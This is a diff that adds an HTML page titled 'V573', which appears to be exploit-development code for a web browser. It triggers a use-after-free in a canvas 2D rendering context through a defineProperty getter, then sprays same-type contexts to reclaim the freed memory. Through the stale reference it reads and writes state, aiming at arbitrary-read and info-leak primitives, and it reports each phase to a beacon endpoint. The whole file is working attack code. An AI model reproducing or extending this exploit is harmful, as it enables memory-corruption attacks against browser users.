@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V573</title></head>
+<body><pre id="out">V573 — defineProperty UAF + same-type reclaim</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/V573-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t=';
+  function f(){try{new Image().src=u+Date.now();}catch(e){}}
+  f();setTimeout(f,500);setTimeout(f,1000);
+}
+
+var f64buf=new Float64Array(1);
+var u32buf=new Uint32Array(f64buf.buffer);
+function dblBits(d){f64buf[0]=d;return{lo:u32buf[0],hi:u32buf[1]};}
+function hex8(v){return('00000000'+((v>>>0).toString(16))).slice(-8);}
+function hexPair(hi,lo){return'0x'+hex8(hi)+hex8(lo);}
+
+var P=new URLSearchParams(location.search);
+var NSAVES=+(P.get('saves')||'32');
+var NSPRAY=+(P.get('spray')||'300');
+var MARKER=+(P.get('marker')||'7777.77');
+
+/* ===== PHASE: BOOT ===== */
+bk('BOOT','saves='+NSAVES+',spray='+NSPRAY+',marker='+MARKER);
+say('BOOT: saves='+NSAVES+' spray='+NSPRAY+' marker='+MARKER);
+
+/* ===== triggerUAF ===== */
+var innerCtx=null;
+function triggerUAF(){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    var ctx=c.getContext('2d');
+    innerCtx=ctx;
+    for(var s=0;s<NSAVES;s++) ctx.save();
+    ctx.lineWidth=1.0;
+    return true;
+  }});
+  c.getContext('bitmaprenderer',d);
+  return c;
+}
+
+/* ===== PHASE: PRE-UAF ===== */
+bk('PRE-UAF','triggering');
+
+var outerC=triggerUAF();
+
+/* ===== PHASE: POST-UAF ===== */
+bk('POST-UAF','ctx='+(innerCtx?'OK':'NULL'));
+say('POST-UAF: innerCtx='+(innerCtx?'OK':'NULL'));
+
+/* ===== PHASE: SPRAY — same-type Canvas2D reclaim ===== */
+/* Spray Canvas2D contexts into 768B size class.
+   Each getContext('2d') allocates a CanvasRenderingContext2D (~744B, class 768).
+   One should reclaim the freed slot. Set marker lineWidth on each. */
+
+var sprayCanvases=[];
+var sprayCtxs=[];
+for(var i=0;i<NSPRAY;i++){
+  var sc=document.createElement('canvas');
+  sc.width=1;sc.height=1;
+  var sctx=sc.getContext('2d');
+  if(sctx){
+    sctx.lineWidth=MARKER;
+    sprayCanvases.push(sc);
+    sprayCtxs.push(sctx);
+  }
+}
+
+bk('SPRAY','n='+sprayCtxs.length);
+say('SPRAY: created '+sprayCtxs.length+' contexts with marker='+MARKER);
+
+/* ===== PHASE: READ — read through stale wrapper ===== */
+var lwR, mlR, gaR, errR;
+try { lwR=innerCtx.lineWidth; } catch(e){ errR='lw:'+e.message; }
+try { mlR=innerCtx.miterLimit; } catch(e){ errR=(errR||'')+' ml:'+e.message; }
+try { gaR=innerCtx.globalAlpha; } catch(e){ errR=(errR||'')+' ga:'+e.message; }
+
+if(errR){
+  bk('READ','ERR:'+errR);
+  say('READ ERR: '+errR);
+} else {
+  var lwBits=dblBits(lwR);
+  var mlBits=dblBits(mlR);
+  var gaBits=dblBits(gaR);
+  bk('READ','lw='+lwR+',ml='+mlR+',ga='+gaR);
+  bk('BITS','lw='+hexPair(lwBits.hi,lwBits.lo)+',ml='+hexPair(mlBits.hi,mlBits.lo)+',ga='+hexPair(gaBits.hi,gaBits.lo));
+  say('READ: lineWidth='+lwR+' raw='+hexPair(lwBits.hi,lwBits.lo));
+  say('  miterLimit='+mlR+' raw='+hexPair(mlBits.hi,mlBits.lo));
+  say('  globalAlpha='+gaR+' raw='+hexPair(gaBits.hi,gaBits.lo));
+
+  if(lwR===MARKER){
+    bk('RECLAIM','CONFIRMED-marker='+MARKER);
+    say('*** RECLAIM CONFIRMED: lineWidth matches marker ***');
+  } else if(lwR===1.0){
+    bk('ALIVE','lineWidth=1-default-or-refpin');
+    say('lineWidth=1.0 — either default from reclaim or ref-pin (context alive)');
+  } else {
+    bk('STALE','lineWidth='+lwR+'-raw='+hexPair(lwBits.hi,lwBits.lo));
+    say('UNEXPECTED lineWidth — may be reading stale/garbage data');
+  }
+}
+
+/* ===== PHASE: WRITE — test bidirectional write through stale wrapper ===== */
+var writeOK=false;
+try {
+  innerCtx.lineWidth=9999.99;
+  var lwW=innerCtx.lineWidth;
+  writeOK=(lwW===9999.99);
+  bk('WRITE','set=9999.99,read='+lwW+',ok='+writeOK);
+  say('WRITE: set 9999.99, read back '+lwW+', match='+writeOK);
+} catch(e){
+  bk('WRITE','ERR:'+e.message);
+  say('WRITE ERR: '+e.message);
+}
+
+/* ===== PHASE: ALIAS-ID — which spray context reclaimed? ===== */
+if(!errR && lwR===MARKER){
+  for(var i=0;i<sprayCtxs.length;i++){
+    if(sprayCtxs[i].lineWidth===9999.99){
+      bk('ALIAS','idx='+i+',lw='+sprayCtxs[i].lineWidth);
+      say('ALIAS: spray context #'+i+' reads 9999.99 — this is the reclaimer');
+      break;
+    }
+  }
+}
+
+/* ===== PHASE: GETLINEDASH — test getLineDash (future arb read primitive) ===== */
+var dashR;
+try {
+  dashR=innerCtx.getLineDash();
+  bk('DASH','len='+dashR.length);
+  say('DASH: getLineDash() returned '+dashR.length+' entries');
+} catch(e){
+  bk('DASH','ERR:'+e.message);
+  say('DASH ERR: '+e.message);
+}
+
+/* ===== PHASE: FILLSTYLE — test fillStyle read (future info leak via Color) ===== */
+var fsR;
+try {
+  fsR=innerCtx.fillStyle;
+  bk('FILL','val='+String(fsR).slice(0,60));
+  say('FILL: fillStyle='+fsR);
+} catch(e){
+  bk('FILL','ERR:'+e.message);
+  say('FILL ERR: '+e.message);
+}
+
+/* ===== PHASE: TRANSFORM — test transform read (6 doubles at State+112) ===== */
+var txR;
+try {
+  var t=innerCtx.getTransform();
+  txR='a='+t.a+',b='+t.b+',c='+t.c+',d='+t.d+',e='+t.e+',f='+t.f;
+  bk('TX',txR);
+  say('TX: '+txR);
+} catch(e){
+  bk('TX','ERR:'+e.message);
+  say('TX ERR: '+e.message);
+}
+
+bk('DONE','complete');
+say('');
+say('V573 complete.');
+</script>
+</body>
+</html>
